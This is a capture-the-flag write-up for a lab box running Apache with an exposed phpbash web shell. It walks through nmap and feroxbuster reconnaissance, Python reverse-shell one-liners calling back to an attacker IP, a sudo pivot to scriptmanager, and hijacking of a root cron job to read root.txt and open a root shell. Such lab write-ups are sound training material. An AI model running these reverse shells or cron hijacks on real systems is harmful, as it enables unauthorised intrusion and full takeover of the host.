### Summary
After scanning the machine on all `TCP` and `UDP` ports, we're left only with `HTTP` on `TCP` port 80. We enumerate the subdirectories with `feroxbuster` to find a `phpbash.php` interactive shell which immediately provides RCE and a foothold on the box. After some simple enumeration, we find that the `phpbash` `www-data` user can perform nopasswd `sudo` commands as the user `scriptmanager`, allowing us to easily pivot to said user. `scriptmanager` has access to the `/scripts` directory which the `root` user is cron'd to execute any python files within. We can easily modify the python file to copy the `/root/root.txt` file into the current directory and even to trigger a python reverse shell as the `root` user

### Tools
- `feroxbuster`

###### [[#Recon]]
- [[#Initial Scanning]]
- [[#HTTP - TCP 80]]
###### [[#User Shell - www-data]]
- [[#Enumeration]]
	- [[#Python Shell Upgrades]]
###### [[#User Shell - scriptmanager]]
- [[#Nopasswd]]
- [[#Enumeration]]
	- [[#root.txt copier]]
###### [[#Root Shell]]
- [[#Python Exploit]]

---
# Recon
## Initial Scanning
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.44.49 -oN nmap/tcp                   
Completed SYN Stealth Scan at 03:29, 6.89s elapsed (65535 total ports)
Nmap scan report for 10.129.44.49
Host is up, received reset ttl 63 (0.026s latency).
Scanned at 2025-12-23 03:28:57 EST for 7s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds
           Raw packets sent: 68024 (2.993MB) | Rcvd: 65536 (2.621MB)

❯ sudo nmap -p 80 -sCV -vv 10.129.44.49 -oN nmap/scripts
Completed NSE at 03:29, 0.00s elapsed
Nmap scan report for 10.129.44.49
Host is up, received echo-reply ttl 63 (0.025s latency).
Scanned at 2025-12-23 03:29:40 EST for 6s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel\'s Development Site

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:29
Completed NSE at 03:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:29
Completed NSE at 03:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:29
Completed NSE at 03:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```
- Only a single `HTTP` port open with a TTL that matches posix machines and an apache version [[OS Enumeration|corresponding with]] ubuntu version `16.04-16.10`
- A follow-up `UDP` scan gives us nothing

## HTTP - TCP 80
---
- Navigating to the page gives us a phpbash blogpost containing a screenshot of a shell within a website:
![[Pasted image 20251223033356.png]]
- We can try to navigate to the same subdomain but it does not exist :(

- We can bust out `feroxbuster` to enumerate web application subdirectories. Given that many of the pages on this web application end in `.html`, we'll feed that as an extension along with `.php` given the screenshot on the phpbash blog post:
```sh
❯ feroxbuster -u "http://10.129.44.49" -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories.txt -x php,html
```
- We get the following notable hits:
	- `http://10.129.44.49/dev/`
		- `http://10.129.44.49/dev/phpbash.php`
		- `http://10.129.44.49/dev/phpbash.min.php`
	- `http://10.129.44.49/php/`
		- `http://10.129.44.49/php/sendMail.php`

# User Shell - www-data
## Enumeration
---
- When we navigate to `http://10.129.44.49/dev/phpbash.php`, we see the shell from the blogpost screenshot!
- From there we can navigate to the `/home` directory and grab the user flag:
```sh
www-data@bashed:/var/www/html/dev# cat /home/arrexel/user.txt
e261c7de66c167c98dd9a6e3285fbd88
```

### Python Shell Upgrades
- We can perform a python shell upgrade with the [following command](https://www.revshells.com/):
```sh
www-data@bashed:/var/www/html/dev# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.50",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
```sh
❯ nc -lvnp 12345                      
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.44.49.
Ncat: Connection from 10.129.44.49:44466.
$ whoami
whoami
www-data
```

- And another python shell upgrade:
```sh
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/var/www/html/dev$ ^Z
[1]  + 1367204 suspended  nc -lvnp 12345
❯ stty raw -echo; fg
[1]  + 1367204 continued  nc -lvnp 12345
                                        reset
reset: unknown terminal type unknown
Terminal type? screen

www-data@bashed:/var/www/html/dev$
```

# User Shell - scriptmanager
## Nopasswd
---
- We can check for `sudo -l` no passwd:
```sh
www-data@bashed:/var/www/html/dev$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
- It looks like we can run sudo as `scriptmanager` without a password
- We can easily get a shell with the following:
```sh
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/var/www/html/dev$ 
```

## Enumeration
---
- We first try to see if `scriptmanager` can do nopasswd via `sudo -l` but we're prompted for a password which we don't know
- We can next search for directories that we own with the following command:
```sh
scriptmanager@bashed:/$ find / -type d -user $(whoami) 2>/dev/null
/scripts
/home/scriptmanager
/home/scriptmanager/.nano
/proc/1370
/proc/1370/task
/proc/1370/task/1370
/proc/1370/task/1370/fd
/proc/1370/task/1370/fdinfo
/proc/1370/task/1370/ns
/proc/1370/task/1370/net
/proc/1370/task/1370/attr
/proc/1370/fd
/proc/1370/map_files
/proc/1370/fdinfo
/proc/1370/ns
/proc/1370/net
/proc/1370/attr
/proc/1396
/proc/1396/task
/proc/1396/task/1396
/proc/1396/task/1396/fd
/proc/1396/task/1396/fdinfo
/proc/1396/task/1396/ns
/proc/1396/task/1396/net
/proc/1396/task/1396/attr
/proc/1396/fd
/proc/1396/map_files
/proc/1396/fdinfo
/proc/1396/ns
/proc/1396/net
/proc/1396/attr
```
- A bunch of processes, our home directory, and interesting a `/scripts` directory!

```sh
scriptmanager@bashed:/scripts$ ls -lah
total 16K
drwxrwxr--  2 scriptmanager scriptmanager 4.0K Jun  2  2022 .
drwxr-xr-x 23 root          root          4.0K Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Dec 23 00:53 test.txt

scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```
- We have a simple python script that writes a file, but it looks like the example file was written as root? Maybe root has a cron that executes this file periodically
	- I waited another minute and sure enough, it was run again!
- We can modify the python file to give us the root flag perhaps?

### root.txt copier
```python
f = open("/root/root.txt", "r")
contents = f.read()
f.close()
f = open("root.txt", "w")
f.write(contents)
f.close()
```
- This simple script will essentially duplicate `root.txt` in the current directory:
```sh
scriptmanager@bashed:/scripts$ ls -lah
total 20K
drwxrwxr--  2 scriptmanager scriptmanager 4.0K Dec 23 01:01 .
drwxr-xr-x 23 root          root          4.0K Jun  2  2022 ..
-rw-r--r--  1 root          root            33 Dec 23 01:01 root.txt
-rw-r--r--  1 scriptmanager scriptmanager  116 Dec 23 01:00 test.py
-rw-r--r--  1 root          root            12 Dec 23 00:57 test.txt
scriptmanager@bashed:/scripts$ cat root.txt 
c177c38530e7ad308a075ed4a5627aae
```

# Root Shell
## Python Exploit
---
- If we wanted a shell, we could instead modify the script to do the following:
```python
import socket, subprocess, os, pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.50",54321))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("sh")
```
```sh
❯ nc -lvnp 54321
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::54321
Ncat: Listening on 0.0.0.0:54321
Ncat: Connection from 10.129.44.49.
Ncat: Connection from 10.129.44.49:59716.
# whoami
whoami
root
crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
```


